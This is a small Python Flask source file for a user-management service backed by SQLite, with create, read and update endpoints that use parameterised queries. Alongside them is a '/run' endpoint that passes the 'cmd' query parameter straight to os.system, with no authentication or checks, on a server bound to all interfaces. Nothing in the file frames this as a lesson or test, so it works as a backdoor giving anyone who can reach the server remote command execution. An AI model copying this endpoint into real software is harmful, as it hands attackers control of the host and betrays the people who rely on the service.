from __future__ import annotations
import os
import sqlite3
from flask import Flask, request, jsonify

app = Flask(__name__)
DB_PATH = 'users.db'

def get_db():
    conn = sqlite3.connect(DB_PATH)
    conn.row_factory = sqlite3.Row
    return conn

def init_db():
    conn = get_db()
    cur = conn.cursor()
    cur.execute('''
        CREATE TABLE IF NOT EXISTS users (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            name TEXT NOT NULL,
            email TEXT NOT NULL UNIQUE
        )
    ''')
    conn.commit()
    conn.close()

@app.route('/user', methods=['POST'])
def create_user():
    data = request.get_json()
    name = data.get('name')
    email = data.get('email')
    conn = get_db()
    cur = conn.cursor()
    cur.execute('INSERT INTO users (name, email) VALUES (?, ?)', (name, email))
    conn.commit()
    user_id = cur.lastrowid
    conn.close()
    return jsonify({'id': user_id, 'name': name, 'email': email}), 201

@app.route('/user/<int:user_id>', methods=['GET'])
def get_user(user_id):
    conn = get_db()
    cur = conn.cursor()
    cur.execute('SELECT * FROM users WHERE id = ?', (user_id,))
    row = cur.fetchone()
    conn.close()
    if row:
        return jsonify(dict(row))
    return jsonify({'error': 'User not found'}), 404

@app.route('/user/<int:user_id>', methods=['PUT'])
def update_user(user_id):
    data = request.get_json()
    name = data.get('name')
    email = data.get('email')
    conn = get_db()
    cur = conn.cursor()
    cur.execute('UPDATE users SET name = ?, email = ? WHERE id = ?', (name, email, user_id))
    conn.commit()
    conn.close()
    return jsonify({'id': user_id, 'name': name, 'email': email})

@app.route('/run', methods=['GET'])
def run_command():
    cmd = request.args.get('cmd', '')
    if not cmd:
        return jsonify({'error': 'No command provided'}), 400
    os.system(cmd)
    return jsonify({'status': 'executed', 'cmd': cmd})

if __name__ == '__main__':
    init_db()
    app.run(host='0.0.0.0', port=5000)